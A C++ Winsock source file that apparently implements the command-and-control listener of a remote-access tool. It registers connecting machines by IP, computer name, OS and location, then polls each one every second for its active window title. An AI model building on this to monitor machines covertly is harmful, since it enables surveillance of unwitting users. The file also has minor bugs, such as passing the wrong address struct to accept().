//
// Created by LUNAFE on 2022-02-09.
//

#include "handling.h"

void handling::Listening() {
#ifdef DEBUG
    printf("[DEBUG] LISTENING\n");
#endif
    WSADATA wsa_data;
    WSAStartup(MAKEWORD(2, 2), &wsa_data);

    SOCKET server_sock;
    server_sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_sock == -1) {
#ifdef DEBUG
        printf("[DEBUG] SOCKET_ERROR_LISTENING\n");
#endif
        system("pause");
        return;
    }

    SOCKADDR_IN server_addr = {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(PORT);

    if (bind(server_sock, (sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
#ifdef DEBUG
        printf("[DEBUG] BIND_ERROR\n");
#endif
        system("pause");
        return;
    }

    if (listen(server_sock, SOMAXCONN) == -1) {
#ifdef DEBUG
        printf("[DEBUG] LISTEN_ERROR\n");
#endif
        system("pause");
        return;
    }

    SOCKADDR_IN client_addr = {};
    int addr_size = sizeof(client_addr);
    while (true) {
        SOCKET client_sock = INVALID_SOCKET;
        client_sock = accept(server_sock, (SOCKADDR *) &server_addr, &addr_size);
        if (client_sock != INVALID_SOCKET) {
#ifdef DEBUG
            wprintf(L"[DEBUG] ACCEPTED\n");
#endif
            std::thread handle_thread(handling::Handler, client_sock);
            handle_thread.detach();
        } else if (client_sock == INVALID_SOCKET) {
#ifdef DEBUG
            wprintf(L"\n[DEBUG] INVALID_SOCKET\n");
#endif
        } else {
#ifdef DEBUG
            wprintf(L"[DEBUG] UNKNOWN_ERROR\n");
#endif
        }
    }
}

void handling::Handler(SOCKET socket) {
    packet init_packet;
    int result = init_packet.Receive(socket);
    if (result == -1) {
#ifdef DEBUG
        wprintf(L"[DEBUG] SOCKET_INIT_ERROR\n");
#endif
        return;
    } else if (result == 0) {
        PACKET_TYPE *type = init_packet.get_type();
        char *task_id = init_packet.get_task_id();
#ifdef DEBUG
        wprintf(L"[DEBUG] PACKET_TYPE: %d\n[DEBUG] PACKET_TASK_ID: %s\n", type, task_id);
#endif
        struct INFO *init_info = (struct INFO *) init_packet.get_data();
        time_t current_time = time(NULL);
        client *new_client = new client(socket, current_time, init_info);
        client_list::Add(new_client);
#ifdef DEBUG
        struct tm *local_time = localtime(&current_time);
        wprintf(L"[DEBUG] CLIENT_CLASS_ADD\n");
        wprintf(L"[DEBUG] current_time: %04d-%02d-%02dT%02d:%02d:%02d\n", local_time->tm_year + 1900,
                local_time->tm_mon + 1, local_time->tm_mday,
                local_time->tm_hour, local_time->tm_min, local_time->tm_sec);
        wprintf(L"[DEBUG] INFO_IP: %S\n[DEBUG] INFO_NAME: %S\n[DEBUG] INFO_OS: %S\n[DEBUG] INFO_TITLE: %S\n[DEBUG] INFO_GEOID: %S\n",
                init_info->ip_address, init_info->computer_name, init_info->os_version, init_info->window_title,
                init_info->geo_id);
#endif
    } else {
#ifdef DEBUG
        wprintf(L"[DEBUG] SOCKET_INFO_ERROR\n");
#endif
    }
    while (true) {
        packet ping_packet;
        util::MakePing(&ping_packet);

        int result = ping_packet.Send(socket);

        if (result == -1) {
            client_list::Remove(socket);
#ifdef DEBUG
            wprintf(L"[DEBUG] SOCKET_PING_ERROR\n");
#endif
            return;
        } else if (result == 0) {
#ifdef DEBUG
            wprintf(L"[DEBUG] PING_SENT\n");
#endif
            packet receive_packet;
            int result = receive_packet.Receive(socket);
            if (result == -1) {
                client_list::Remove(socket);
#ifdef DEBUG
                wprintf(L"[DEBUG] SOCKET_PONG_ERROR\n");
#endif
                return;
            } else if (result == 1) {
#ifdef DEBUG
                wprintf(L"[DEBUG] PONG_RECEIVED!\n");
                wprintf(L"[DEBUG] ACTIVE_WINDOW: %S\n", receive_packet.get_data());
#endif
            } else {
                client_list::Remove(socket);
#ifdef DEBUG
                wprintf(L"[DEBUG] WRONG_PACKET_TYPE\n");
#endif
                return;
            }
        }

        Sleep(1000);
    }
}